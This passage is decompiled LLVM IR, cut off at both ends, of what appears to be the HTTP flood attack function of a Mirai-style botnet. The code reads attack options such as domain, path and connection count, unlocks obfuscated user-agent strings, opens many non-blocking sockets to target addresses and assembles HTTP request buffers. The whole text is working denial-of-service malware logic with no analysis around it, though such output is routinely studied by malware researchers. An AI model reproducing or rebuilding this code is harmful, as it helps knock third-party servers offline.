  %v11_8318 = call i8* @attack_get_opt_str(i8 %opts_len, i32 %opts, i8 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22dc8.29, i32 0, i32 0))
  %v13_8318 = ptrtoint i8* %v11_8318 to i32
  %v11_8350 = call i8* @attack_get_opt_str(i8 %opts_len, i32 %opts, i8 8, i8* null)
  %v11_8388 = call i8* @attack_get_opt_str(i8 %opts_len, i32 %opts, i8 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22dcc.31, i32 0, i32 0))
  %v9_83c0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 24, i32 1)
  %v9_83f8 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 80)
  %v1_83fc33 = urem i32 %v9_83f8, 65536
  store i32 %v2_8260, i32* @lr, align 4
  %v3_8410 = ptrtoint i32* %wait_time_-10457 to i32
  %v3_8428 = bitcast i32* %wait_time_-10457 to i8*
  %v4_8428 = call i32 @__GI_memset(i8* %v3_8428, i32 0, i32 10241)
  %v2_8430 = icmp eq i8* %v11_8350, null
  br i1 %v2_8430, label %dec_label_pc_ba78, label %dec_label_pc_8438

dec_label_pc_8438:                                ; preds = %entry
  %v2_843c = icmp eq i8* %v11_8388, null
  br i1 %v2_843c, label %dec_label_pc_ba78, label %dec_label_pc_8448

dec_label_pc_8448:                                ; preds = %dec_label_pc_8438
  %v3_844c = call i32 @util_strlen(i8* nonnull %v11_8388)
  %v8_8458 = icmp sgt i32 %v3_844c, 255
  br i1 %v8_8458, label %dec_label_pc_ba78, label %dec_label_pc_845c

dec_label_pc_845c:                                ; preds = %dec_label_pc_8448
  %v3_8460 = call i32 @util_strlen(i8* nonnull %v11_8350)
  %v8_846c = icmp sgt i32 %v3_8460, 127
  br i1 %v8_846c, label %dec_label_pc_ba78, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_845c
  %v3_8474 = call i32 @util_strlen(i8* %v11_8318)
  %v8_8480 = icmp sgt i32 %v3_8474, 9
  br i1 %v8_8480, label %dec_label_pc_ba78, label %dec_label_pc_8504

dec_label_pc_8490:                                ; preds = %dec_label_pc_8504
  %v2_849c = add i32 %v3_8510, %v13_8318
  %v1_84a0 = inttoptr i32 %v2_849c to i8*
  %v2_84a0 = load i8, i8* %v1_84a0, align 1
  %tmp = icmp ult i8 %v2_84a0, 97
  br i1 %tmp, label %dec_label_pc_84f8, label %dec_label_pc_84ac

dec_label_pc_84ac:                                ; preds = %dec_label_pc_8490
  %v2_84bc = load i8, i8* %v1_84a0, align 1
  %tmp218 = icmp ugt i8 %v2_84bc, 122
  br i1 %tmp218, label %dec_label_pc_84f8, label %dec_label_pc_84c8

dec_label_pc_84c8:                                ; preds = %dec_label_pc_84ac
  %v2_84e8 = load i8, i8* %v1_84a0, align 1
  %v1_84ec = add i8 %v2_84e8, -32
  store i8 %v1_84ec, i8* %v1_84a0, align 1
  %v3_84f8.pre = load i32, i32* %i_-216, align 4
  br label %dec_label_pc_84f8

dec_label_pc_84f8:                                ; preds = %dec_label_pc_84ac, %dec_label_pc_8490, %dec_label_pc_84c8
  %v3_84f8 = phi i32 [ %v3_8510, %dec_label_pc_84ac ], [ %v3_8510, %dec_label_pc_8490 ], [ %v3_84f8.pre, %dec_label_pc_84c8 ]
  %v1_84fc = add i32 %v3_84f8, 1
  br label %dec_label_pc_8504

dec_label_pc_8504:                                ; preds = %dec_label_pc_8470, %dec_label_pc_84f8
  %storemerge21 = phi i32 [ %v1_84fc, %dec_label_pc_84f8 ], [ 0, %dec_label_pc_8470 ]
  store i32 %storemerge21, i32* %i_-216, align 4
  %v3_8508 = call i32 @util_strlen(i8* %v11_8318)
  %v3_8510 = load i32, i32* %i_-216, align 4
  %v8_8518 = icmp sgt i32 %v3_8508, %v3_8510
  br i1 %v8_8518, label %dec_label_pc_8490, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8504
  %v7_8524 = icmp slt i32 %v9_83c0, 257
  br i1 %v7_8524, label %dec_label_pc_8530, label %dec_label_pc_8528

dec_label_pc_8528:                                ; preds = %dec_label_pc_851c
  br label %dec_label_pc_8530

dec_label_pc_8530:                                ; preds = %dec_label_pc_851c, %dec_label_pc_8528
  %sockets_-180.0 = phi i32 [ %v9_83c0, %dec_label_pc_851c ], [ 256, %dec_label_pc_8528 ]
  call void @table_unlock_val(i8 36)
  call void @table_unlock_val(i8 37)
  call void @table_unlock_val(i8 38)
  call void @table_unlock_val(i8 39)
  call void @table_unlock_val(i8 40)
  call void @table_unlock_val(i8 41)
  call void @table_unlock_val(i8 42)
  call void @table_unlock_val(i8 43)
  call void @table_unlock_val(i8 44)
  call void @table_unlock_val(i8 45)
  call void @table_unlock_val(i8 46)
  %v2_8598 = call i32 @calloc(i32 %sockets_-180.0, i32 3140)
  %v6_865c = urem i32 %tmp76, 256
  %v2_86cc = add i32 %v2_8598, 532
  %v2_883c = add i32 %v2_8598, 1440
  %v2_887c = add i32 %v2_8598, 1431
  %v2_88c0 = add i32 %v2_8598, 789
  %v5_8cd0209 = icmp sgt i32 %sockets_-180.0, 0
  br i1 %v5_8cd0209, label %dec_label_pc_85b0, label %dec_label_pc_8cd4.preheader

dec_label_pc_85b0:                                ; preds = %dec_label_pc_8530, %dec_label_pc_8c78
  %storemerge22210 = phi i32 [ %v1_8cbc, %dec_label_pc_8c78 ], [ 0, %dec_label_pc_8530 ]
  %v3_85d0 = mul i32 %storemerge22210, 3140
  %v2_85dc = add i32 %v3_85d0, %v2_8598
  %v3_85e4 = add i32 %v2_85dc, 4
  %v4_85e4 = inttoptr i32 %v3_85e4 to i8*
  store i8 0, i8* %v4_85e4, align 1
  %v2_861c = inttoptr i32 %v2_85dc to i32*
  store i32 -1, i32* %v2_861c, align 4
  store i32 %v2_85dc, i32* @r4, align 4
  %v3_866c = urem i32 %storemerge22210, %v6_865c
  %v2_867c = mul nuw nsw i32 %v3_866c, 24
  %v2_8694 = add i32 %v2_867c, %targs
  %v1_8698 = add i32 %v2_8694, 16
  %v2_8698 = inttoptr i32 %v1_8698 to i32*
  %v3_8698 = load i32, i32* %v2_8698, align 4
  %v2_869c = add i32 %v2_85dc, 16
  %v3_869c = inttoptr i32 %v2_869c to i32*
  store i32 %v3_8698, i32* %v3_869c, align 4
  %v1_86d0 = add i32 %v2_86cc, %v3_85d0
  %v1_86d4 = inttoptr i32 %v1_86d0 to i8*
  %v6_86dc = call i32 @util_strcpy(i8* %v1_86d4, i8* nonnull %v11_8388)
  %v1_8710 = add i32 %v2_85dc, 532
  %v2_8710 = inttoptr i32 %v1_8710 to i8*
  %v3_8710 = load i8, i8* %v2_8710, align 1
  %v7_8714 = icmp eq i8 %v3_8710, 47
  br i1 %v7_8714, label %dec_label_pc_8810, label %dec_label_pc_871c

dec_label_pc_871c:                                ; preds = %dec_label_pc_85b0
  %v1_8750 = add i32 %v2_85dc, 533
  store i32 %v1_8750, i32* @r4, align 4
  store i32 %v1_8710, i32* @r5, align 4
  %v3_87c0 = call i32 @util_strlen(i8* %v1_86d4)
  store i32 %v3_87c0, i32* @r3, align 4
  %v0_87c8 = load i32, i32* @r4, align 4
  store i32 %v0_87c8, i32* @r0, align 4
  %v0_87cc = load i32, i32* @r5, align 4
  store i32 %v0_87cc, i32* @r1, align 4
  store i32 %v3_87c0, i32* @r2, align 4
  %v3_87d4 = call i32 @memmove(i32 %v0_87c8, i32 %v0_87cc, i32 %v3_87c0)
  store i8 47, i8* %v2_8710, align 1
  br label %dec_label_pc_8810

dec_label_pc_8810:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_871c
  %v1_8840 = add i32 %v2_883c, %v3_85d0
  %v1_8844 = inttoptr i32 %v1_8840 to i8*
  %v6_884c = call i32 @util_strcpy(i8* %v1_8844, i8* %v11_8318)
  %v1_8884 = add i32 %v2_887c, %v3_85d0
  %v1_8888 = inttoptr i32 %v1_8884 to i8*
  %v6_8890 = call i32 @util_strcpy(i8* %v1_8888, i8* %v11_8318)
  %v1_88c8 = add i32 %v2_88c0, %v3_85d0
  %v1_88cc = inttoptr i32 %v1_88c8 to i8*
  %v6_88d4 = call i32 @util_strcpy(i8* %v1_88cc, i8* nonnull %v11_8350)
  %v1_8920 = add i32 %v2_8694, 20
  %v2_8920 = inttoptr i32 %v1_8920 to i8*
  %v3_8920 = load i8, i8* %v2_8920, align 1
  %tmp219 = icmp ugt i8 %v3_8920, 31
  br i1 %tmp219, label %dec_label_pc_8a20, label %dec_label_pc_892c

dec_label_pc_892c:                                ; preds = %dec_label_pc_8810
  store i32 %v2_85dc, i32* @r4, align 4
  %v3_89a4 = load i32, i32* %v2_8698, align 4
  %v1_89ac = call i32 @__GI_ntohl(i32 %v3_89a4)
  store i32 %v1_89ac, i32* @r5, align 4
  %v0_89b4 = call i32 @rand_next()
  store i32 %v0_89b4, i32* @r6, align 4
  %v3_8a04 = load i8, i8* %v2_8920, align 1
  %v4_8a04 = zext i8 %v3_8a04 to i32
  %v6_8a08 = lshr i32 %v0_89b4, %v4_8a04
  %v0_8a0c = load i32, i32* @r5, align 4
  %v2_8a0c = add i32 %v0_8a0c, %v6_8a08
  %v1_8a14 = call i32 @__GI_htonl(i32 %v2_8a0c)
  %v1_8a1c = load i32, i32* @r4, align 4
  %v2_8a1c = add i32 %v1_8a1c, 16
  %v3_8a1c = inttoptr i32 %v2_8a1c to i32*
  store i32 %v1_8a14, i32* %v3_8a1c, align 4
  br label %dec_label_pc_8a20

dec_label_pc_8a20:                                ; preds = %dec_label_pc_8810, %dec_label_pc_892c
  %v0_8a20 = call i32 @rand_next()
  %v3_8a30 = udiv i32 %v0_8a20, 5
  %v2_8a54 = sub i32 %v0_8a20, %v3_8a30
  store i32 %v2_8a54, i32* @lr, align 4
  switch i32 %v2_8a54, label %dec_label_pc_8c78 [
    i32 0, label %dec_label_pc_8a88
    i32 1, label %dec_label_pc_8aec
    i32 2, label %dec_label_pc_8b50
    i32 3, label %dec_label_pc_8bb4
    i32 4, label %dec_label_pc_8c18
  ]

dec_label_pc_8a88:                                ; preds = %dec_label_pc_8a20
  call void @table_unlock_val(i8 47)
  %v1_8ac0 = add i32 %v2_85dc, 20
  store i32 %v1_8ac0, i32* @r4, align 4
  %v3_8acc = call i8* @table_retrieve_val(i32 47, i32* null)
  %v0_8ad4 = load i32, i32* @r4, align 4
  %v1_8ad4 = inttoptr i32 %v0_8ad4 to i8*
  %v6_8adc = call i32 @util_strcpy(i8* %v1_8ad4, i8* %v3_8acc)
  call void @table_lock_val(i8 47)
  br label %dec_label_pc_8c78

dec_label_pc_8aec:                                ; preds = %dec_label_pc_8a20
  call void @table_unlock_val(i8 48)
  %v1_8b24 = add i32 %v2_85dc, 20
  store i32 %v1_8b24, i32* @r4, align 4
  %v3_8b30 = call i8* @table_retrieve_val(i32 48, i32* null)
  %v0_8b38 = load i32, i32* @r4, align 4
  %v1_8b38 = inttoptr i32 %v0_8b38 to i8*
  %v6_8b40 = call i32 @util_strcpy(i8* %v1_8b38, i8* %v3_8b30)
  call void @table_lock_val(i8 48)
  br label %dec_label_pc_8c78

dec_label_pc_8b50:                                ; preds = %dec_label_pc_8a20
  call void @table_unlock_val(i8 49)
  %v1_8b88 = add i32 %v2_85dc, 20
  store i32 %v1_8b88, i32* @r4, align 4
  %v3_8b94 = call i8* @table_retrieve_val(i32 49, i32* null)
  %v0_8b9c = load i32, i32* @r4, align 4
  %v1_8b9c = inttoptr i32 %v0_8b9c to i8*
  %v6_8ba4 = call i32 @util_strcpy(i8* %v1_8b9c, i8* %v3_8b94)
  call void @table_lock_val(i8 49)
  br label %dec_label_pc_8c78

dec_label_pc_8bb4:                                ; preds = %dec_label_pc_8a20
  call void @table_unlock_val(i8 50)
  %v1_8bec = add i32 %v2_85dc, 20
  store i32 %v1_8bec, i32* @r4, align 4
  %v3_8bf8 = call i8* @table_retrieve_val(i32 50, i32* null)
  %v0_8c00 = load i32, i32* @r4, align 4
  %v1_8c00 = inttoptr i32 %v0_8c00 to i8*
  %v6_8c08 = call i32 @util_strcpy(i8* %v1_8c00, i8* %v3_8bf8)
  call void @table_lock_val(i8 50)
  br label %dec_label_pc_8c78

dec_label_pc_8c18:                                ; preds = %dec_label_pc_8a20
  call void @table_unlock_val(i8 51)
  %v1_8c50 = add i32 %v2_85dc, 20
  store i32 %v1_8c50, i32* @r4, align 4
  %v3_8c5c = call i8* @table_retrieve_val(i32 51, i32* null)
  %v0_8c64 = load i32, i32* @r4, align 4
  %v1_8c64 = inttoptr i32 %v0_8c64 to i8*
  %v6_8c6c = call i32 @util_strcpy(i8* %v1_8c64, i8* %v3_8c5c)
  call void @table_lock_val(i8 51)
  br label %dec_label_pc_8c78

dec_label_pc_8c78:                                ; preds = %dec_label_pc_8a20, %dec_label_pc_8bb4, %dec_label_pc_8b50, %dec_label_pc_8aec, %dec_label_pc_8a88, %dec_label_pc_8c18
  %v6_8cb4 = call i32 @util_strcpy(i8* %v1_86d4, i8* nonnull %v11_8388)
  %v1_8cbc = add nuw nsw i32 %storemerge22210, 1
  %v5_8cd0 = icmp slt i32 %v1_8cbc, %sockets_-180.0
  br i1 %v5_8cd0, label %dec_label_pc_85b0, label %dec_label_pc_8cd4.preheader

dec_label_pc_8cd4.preheader:                      ; preds = %dec_label_pc_8c78, %dec_label_pc_8530
  %v2_8cf4 = ptrtoint %anon_struct_0* %fdset_rd_-10620 to i32
  %v2_8d38 = ptrtoint %anon_struct_0.1* %fdset_wr_-10748 to i32
  %v3_8e0c = ptrtoint i32* %addr_-10484 to i32
  %v2_8ed4 = ptrtoint i32* %i_-216 to i32
  %v2_9184 = ptrtoint [10240 x i8]* %buf_-20988 to i32
  %tmp161 = getelementptr inbounds [10240 x i8], [10240 x i8]* %buf_-20988, i32 0, i32 0
  %v2_951c = icmp eq i8* %v14_82e0, null
  %v3_9bf4 = ptrtoint %timeval* %tim_-10468 to i32
  %v5_9c14 = getelementptr inbounds %timeval, %timeval* %tim_-10468, i32 0, i32 0
  %v2_9d48 = ptrtoint i32* %err_-10488 to i32
  %v2_9d54 = ptrtoint i32* %err_len_-10492 to i32
  br label %dec_label_pc_8d08.lr.ph

dec_label_pc_8d08.lr.ph:                          ; preds = %dec_label_pc_9be4, %dec_label_pc_9bd8, %dec_label_pc_ba58, %dec_label_pc_ba64.preheader, %dec_label_pc_8cd4.preheader
  %v2_8ce0 = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_8d08

dec_label_pc_8d08:                                ; preds = %dec_label_pc_8d08.lr.ph, %dec_label_pc_8d08
  %storemerge2341 = phi i32 [ 0, %dec_label_pc_8d08.lr.ph ], [ %v1_8d1c, %dec_label_pc_8d08 ]
  %v5_8d14 = mul i32 %storemerge2341, 4
  %v6_8d14 = add i32 %v5_8d14, %v2_8cf4
  %v7_8d14 = inttoptr i32 %v6_8d14 to i32*
  store i32 0, i32* %v7_8d14, align 4
  %v1_8d1c = add i32 %storemerge2341, 1
  %tmp220 = icmp ult i32 %v1_8d1c, 32
  br i1 %tmp220, label %dec_label_pc_8d08, label %dec_label_pc_8d4c.lr.ph

dec_label_pc_8d4c.lr.ph:                          ; preds = %dec_label_pc_8d08
  br label %dec_label_pc_8d4c

dec_label_pc_8d4c:                                ; preds = %dec_label_pc_8d4c.lr.ph, %dec_label_pc_8d4c
  %v4_8d68181 = phi i32 [ 0, %dec_label_pc_8d4c.lr.ph ], [ %v1_8d60, %dec_label_pc_8d4c ]
  %v5_8d58 = mul i32 %v4_8d68181, 4
  %v6_8d58 = add i32 %v5_8d58, %v2_8d38
  %v7_8d58 = inttoptr i32 %v6_8d58 to i32*
  store i32 0, i32* %v7_8d58, align 4
  %v1_8d60 = add i32 %v4_8d68181, 1
  %v4_8d64 = inttoptr i32 %v1_8d60 to %anon_struct_0*
  %v7_8d6c = icmp eq %anon_struct_0* %v4_8d64, inttoptr (i32 31 to %anon_struct_0*)
  %v2_8d70 = icmp ule %anon_struct_0* %v4_8d64, inttoptr (i32 30 to %anon_struct_0*)
  %v3_8d70 = or i1 %v7_8d6c, %v2_8d70
  br i1 %v3_8d70, label %dec_label_pc_8d4c, label %dec_label_pc_9bc8.preheader

dec_label_pc_9bc8.preheader:                      ; preds = %dec_label_pc_8d4c
  br i1 %v5_8cd0209, label %dec_label_pc_8d80, label %dec_label_pc_9bd8

dec_label_pc_8d80:                                ; preds = %dec_label_pc_9bc8.preheader, %dec_label_pc_9bbc
  %storemerge24192 = phi i32 [ %v1_9bc0, %dec_label_pc_9bbc ], [ 0, %dec_label_pc_9bc8.preheader ]
  %nfds_-172.1191 = phi i32 [ %nfds_-172.0, %dec_label_pc_9bbc ], [ 0, %dec_label_pc_9bc8.preheader ]
  store i32 %storemerge24192, i32* @r1, align 4
  %v3_8da0 = mul i32 %storemerge24192, 3140
  %v2_8dac = add i32 %v3_8da0, %v2_8598
  %v1_8db8 = add i32 %v2_8dac, 4
  %v2_8db8 = inttoptr i32 %v1_8db8 to i8*
  %v3_8db8 = load i8, i8* %v2_8db8, align 1
  %v7_8dbc = icmp eq i8 %v3_8db8, 1
  br i1 %v7_8dbc, label %dec_label_pc_8dc4, label %dec_label_pc_8df0

dec_label_pc_8dc4:                                ; preds = %dec_label_pc_8d80
  %v1_8dc8 = add i32 %v2_8dac, 1456
  %v2_8dc8 = inttoptr i32 %v1_8dc8 to i32*
  %v3_8dc8 = load i32, i32* %v2_8dc8, align 4
  %v2_8dcc = icmp eq i32 %v3_8dc8, 0
  br i1 %v2_8dcc, label %dec_label_pc_8de4, label %dec_label_pc_8dd4

dec_label_pc_8dd4:                                ; preds = %dec_label_pc_8dc4
  store i8 4, i8* %v2_8db8, align 1
  br label %dec_label_pc_8df0

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8dc4
  store i8 0, i8* %v2_8db8, align 1
  br label %dec_label_pc_8df0

dec_label_pc_8df0:                                ; preds = %dec_label_pc_8d80, %dec_label_pc_8dd4, %dec_label_pc_8de4
  %v3_8df4 = load i8, i8* %v2_8db8, align 1
  %v2_8df8 = icmp eq i8 %v3_8df4, 0
  br i1 %v2_8df8, label %dec_label_pc_8e00, label %dec_label_pc_9024

dec_label_pc_8e00:                                ; preds = %dec_label_pc_8df0
  store i32 %v2_8260, i32* @r1, align 4
  store i32 0, i32* %addr_-10484, align 4
  %v1_8e40 = inttoptr i32 %v2_8dac to i32*
  %v2_8e40 = load i32, i32* %v1_8e40, align 4
  %v7_8e44 = icmp eq i32 %v2_8e40, -1
  br i1 %v7_8e44, label %dec_label_pc_8e5c, label %dec_label_pc_8e4c

dec_label_pc_8e4c:                                ; preds = %dec_label_pc_8e00
  %v2_8e50 = load i32, i32* %v1_8e40, align 4
  %v1_8e58 = call i32 @__GI___libc_close(i32 %v2_8e50)
  br label %dec_label_pc_8e5c

dec_label_pc_8e5c:                                ; preds = %dec_label_pc_8e00, %dec_label_pc_8e4c
  %v3_8e68 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_8e68, i32* %v1_8e40, align 4
  %v7_8e80 = icmp eq i32 %v3_8e68, -1
  br i1 %v7_8e80, label %dec_label_pc_9bbc, label %dec_label_pc_8e88

dec_label_pc_8e88:                                ; preds = %dec_label_pc_8e5c
  %v2_8e8c = load i32, i32* %v1_8e40, align 4
  store i32 %v2_8e8c, i32* @r4, align 4
  %v2_8e94 = load i32, i32* %v1_8e40, align 4
  store i32 %v2_8e94, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_8ea4 = call i32 @__libc_fcntl(i32 %v2_8e94, i32 3)
  %v1_8eac = or i32 %v2_8ea4, 2048
  store i32 %v1_8eac, i32* @r3, align 4
  %v0_8eb0 = load i32, i32* @r4, align 4
  store i32 %v1_8eac, i32* @r2, align 4
  %v2_8ebc = call i32 @__libc_fcntl(i32 %v0_8eb0, i32 4)
  store i32 65535, i32* %i_-216, align 4
  %v2_8ed0 = load i32, i32* %v1_8e40, align 4
  %v5_8ef0 = call i32 @__GI_setsockopt(i32 %v2_8ed0, i32 0, i32 8, i32 %v2_8ed4, i32 4)
  store i32 2, i32* %addr_-10484, align 4
  %v1_8f34 = call i32 @__GI_htons(i32 %v1_83fc33)
  %v2_8f64 = add i32 %v2_8dac, 8
  %v3_8f64 = inttoptr i32 %v2_8f64 to i32*
  store i32 %v2_8ce0, i32* %v3_8f64, align 4
  store i8 2, i8* %v2_8db8, align 1
  %v2_8f78 = load i32, i32* %v1_8e40, align 4
  %v3_8f94 = call i32 @__libc_connect(i32 %v2_8f78, i32 %v3_8e0c, i32 16)
  %v2_8f9c = load i32, i32* %v1_8e40, align 4
  %v3_8fa0 = udiv i32 %v2_8f9c, 32
  %v3_8fb4 = mul nuw nsw i32 %v3_8fa0, 4
  %v2_8fbc = add i32 %v3_8fb4, %v2_8260
  %v2_8fc0 = add i32 %v2_8fbc, -10716
  %v1_8fc4 = inttoptr i32 %v2_8fc0 to i32*
  %v2_8fc4 = load i32, i32* %v1_8fc4, align 4
  %v2_8fcc = load i32, i32* %v1_8e40, align 4
  %v1_8fd0 = urem i32 %v2_8fcc, 32
  %v6_8fd8 = shl i32 1, %v1_8fd0
  %v2_8fdc = or i32 %v6_8fd8, %v2_8fc4
  store i32 %v2_8260, i32* @lr, align 4
  store i32 %v2_8fdc, i32* %v1_8fc4, align 4
  %v2_9000 = load i32, i32* %v1_8e40, align 4
  %v2_9008 = sub i32 %v2_9000, %nfds_-172.1191
  %v4_9008 = xor i32 %v2_9000, %nfds_-172.1191
  %v5_9008 = xor i32 %v2_9008, %v2_9000
  %v6_9008 = and i32 %v5_9008, %v4_9008
  %v7_9008 = icmp slt i32 %v6_9008, 0
  %v8_9008 = icmp slt i32 %v2_9008, 0
  %v9_9008 = icmp eq i32 %v2_9000, %nfds_-172.1191
  %v3_900c = xor i1 %v8_9008, %v7_9008
  %v4_900c = or i1 %v9_9008, %v3_900c
  br i1 %v4_900c, label %dec_label_pc_9bbc, label %dec_label_pc_9010

dec_label_pc_9010:                                ; preds = %dec_label_pc_8e88
  %v2_9014 = load i32, i32* %v1_8e40, align 4
  %v1_9018 = add i32 %v2_9014, 1
  br label %dec_label_pc_9bbc

dec_label_pc_9024:                                ; preds = %dec_label_pc_8df0
  %v3_9028 = load i8, i8* %v2_8db8, align 1
  %v7_902c = icmp eq i8 %v3_9028, 2
  br i1 %v7_902c, label %dec_label_pc_9034, label %dec_label_pc_9130

dec_label_pc_9034:                                ; preds = %dec_label_pc_9024
  %v1_9038 = add i32 %v2_8dac, 8
  %v2_9038 = inttoptr i32 %v1_9038 to i32*
  %v3_9038 = load i32, i32* %v2_9038, align 4
  %v2_9044 = sub i32 %v2_8ce0, %v3_9038
  %tmp221 = icmp ult i32 %v2_9044, 31
  br i1 %tmp221, label %dec_label_pc_907c, label %dec_label_pc_9050

dec_label_pc_9050:                                ; preds = %dec_label_pc_9034
  store i8 0, i8* %v2_8db8, align 1
  %v1_9060 = inttoptr i32 %v2_8dac to i32*
  %v2_9060 = load i32, i32* %v1_9060, align 4
  %v1_9068 = call i32 @__GI___libc_close(i32 %v2_9060)
  store i32 -1, i32* %v1_9060, align 4
  br label %dec_label_pc_9bbc

dec_label_pc_907c:                                ; preds = %dec_label_pc_9034
  %v1_9080 = inttoptr i32 %v2_8dac to i32*
  %v2_9080 = load i32, i32* %v1_9080, align 4
  %v3_9084 = udiv i32 %v2_9080, 32
  %v3_9098 = mul nuw nsw i32 %v3_9084, 4
  %v2_90a0 = add i32 %v3_9098, %v2_8260
  %v2_90a4 = add i32 %v2_90a0, -10716
  %v1_90a8 = inttoptr i32 %v2_90a4 to i32*
  %v2_90a8 = load i32, i32* %v1_90a8, align 4
  %v2_90b0 = load i32, i32* %v1_9080, align 4
  %v1_90b4 = urem i32 %v2_90b0, 32
  %v6_90bc = shl i32 1, %v1_90b4
  %v2_90c0 = or i32 %v6_90bc, %v2_90a8
  store i32 %v2_8260, i32* @lr, align 4
  store i32 %v2_90c0, i32* %v1_90a8, align 4
  %v2_90e4 = load i32, i32* %v1_9080, align 4
  %v2_90ec = sub i32 %v2_90e4, %nfds_-172.1191
  %v4_90ec = xor i32 %v2_90e4, %nfds_-172.1191
  %v5_90ec = xor i32 %v2_90ec, %v2_90e4
  %v6_90ec = and i32 %v5_90ec, %v4_90ec
  %v7_90ec = icmp slt i32 %v6_90ec, 0
  %v8_90ec = icmp slt i32 %v2_90ec, 0
  %v9_90ec = icmp eq i32 %v2_90e4, %nfds_-172.1191
  %v3_90f0 = xor i1 %v8_90ec, %v7_90ec
  %v4_90f0 = or i1 %v9_90ec, %v3_90f0
  br i1 %v4_90f0, label %dec_label_pc_9bbc, label %dec_label_pc_90f4

dec_label_pc_90f4:                                ; preds = %dec_label_pc_907c
  %v2_90f8 = load i32, i32* %v1_9080, align 4
  %v1_90fc = add i32 %v2_90f8, 1
  br label %dec_label_pc_9bbc

dec_label_pc_9130:                                ; preds = %dec_label_pc_9024
  %v3_9134 = load i8, i8* %v2_8db8, align 1
  %v7_9138 = icmp eq i8 %v3_9134, 4
  br i1 %v7_9138, label %dec_label_pc_9140, label %dec_label_pc_9984

dec_label_pc_9140:                                ; preds = %dec_label_pc_9130
  %v2_9148 = add i32 %v2_8dac, 1464
  %v3_9148 = inttoptr i32 %v2_9148 to i32*
  store i32 -1, i32* %v3_9148, align 4
  %v2_9154 = add i32 %v2_8dac, 1452
  %v3_9154 = inttoptr i32 %v2_9154 to i32*
  store i32 0, i32* %v3_9154, align 4
  %v1_9160 = add i32 %v2_8dac, 2116
  %v1_9164 = inttoptr i32 %v1_9160 to i8*
  call void @util_zero(i8* %v1_9164, i32 1024)
  %v2_9178 = add i32 %v2_8dac, 2112
  %v3_9178 = inttoptr i32 %v2_9178 to i32*
  store i32 0, i32* %v3_9178, align 4
  call void @util_zero(i8* %tmp161, i32 10240)
  %v3_91a4 = call i32 @util_strlen(i8* %tmp161)
  %v2_91b8 = add i32 %v3_91a4, %v2_9184
  %v1_91c4 = add i32 %v2_8dac, 1431
  %v1_91c8 = inttoptr i32 %v2_91b8 to i8*
  %v1_91cc = inttoptr i32 %v1_91c4 to i8*
  %v6_91d0 = call i32 @util_strcpy(i8* %v1_91c8, i8* %v1_91cc)
  %v3_91e4 = call i32 @util_strlen(i8* %tmp161)
  %v2_91fc = add i32 %v3_91e4, %v2_9184
  %v1_9200 = inttoptr i32 %v2_91fc to i8*
  %v6_9208 = call i32 @util_strcpy(i8* %v1_9200, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22dd0.35, i32 0, i32 0))
  %v3_921c = call i32 @util_strlen(i8* %tmp161)
  %v2_9234 = add i32 %v3_921c, %v2_9184
  %v1_923c = add i32 %v2_8dac, 532
  %v1_9240 = inttoptr i32 %v2_9234 to i8*
  %v1_9244 = inttoptr i32 %v1_923c to i8*
  %v6_9248 = call i32 @util_strcpy(i8* %v1_9240, i8* %v1_9244)
  %v3_925c = call i32 @util_strlen(i8* %tmp161)
  %v2_9274 = add i32 %v3_925c, %v2_9184
  %v1_9278 = inttoptr i32 %v2_9274 to i8*
  %v6_9280 = call i32 @util_strcpy(i8* %v1_9278, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_22dd4.37, i32 0, i32 0))
  %v3_9294 = call i32 @util_strlen(i8* %tmp161)
  %v2_92ac = add i32 %v3_9294, %v2_9184
  %v1_92b4 = add i32 %v2_8dac, 20
  %v1_92b8 = inttoptr i32 %v2_92ac to i8*
  %v1_92bc = inttoptr i32 %v1_92b4 to i8*
  %v6_92c0 = call i32 @util_strcpy(i8* %v1_92b8, i8* %v1_92bc)
  %v3_92d4 = call i32 @util_strlen(i8* %tmp161)
  %v2_92ec = add i32 %v3_92d4, %v2_9184
  %v1_92f0 = inttoptr i32 %v2_92ec to i8*
  %v6_92f8 = call i32 @util_strcpy(i8* %v1_92f0, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22dec.39, i32 0, i32 0))
  %v3_930c = call i32 @util_strlen(i8* %tmp161)
  %v2_9320 = add i32 %v3_930c, %v2_9184
  %v1_932c = add i32 %v2_8dac, 789
  %v1_9330 = inttoptr i32 %v2_9320 to i8*
  %v1_9334 = inttoptr i32 %v1_932c to i8*
  %v6_9338 = call i32 @util_strcpy(i8* %v1_9330, i8* %v1_9334)
  %v3_934c = call i32 @util_strlen(i8* %tmp161)
  %v2_9364 = add i32 %v3_934c, %v2_9184
  %v1_9368 = inttoptr i32 %v2_9364 to i8*
  %v6_9370 = call i32 @util_strcpy(i8* %v1_9368, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  call void @table_unlock_val(i8 32)
  %v3_938c = call i32 @util_strlen(i8* %tmp161)
  %v2_93a0 = add i32 %v3_938c, %v2_9184
  store i32 %v2_93a0, i32* %r4.global-to-local, align 4
  %v3_93ac = call i8* @table_retrieve_val(i32 32, i32* null)
  %v0_93b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_93b4 = inttoptr i32 %v0_93b4 to i8*
  %v6_93bc = call i32 @util_strcpy(i8* %v1_93b4, i8* %v3_93ac)
  call void @table_lock_val(i8 32)
  %v3_93d8 = call i32 @util_strlen(i8* %tmp161)
  %v2_93f0 = add i32 %v3_93d8, %v2_9184
  %v1_93f4 = inttoptr i32 %v2_93f0 to i8*
  %v6_93fc = call i32 @util_strcpy(i8* %v1_93f4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  call void @table_unlock_val(i8 33)
  %v3_9418 = call i32 @util_strlen(i8* %tmp161)
  %v2_942c = add i32 %v3_9418, %v2_9184
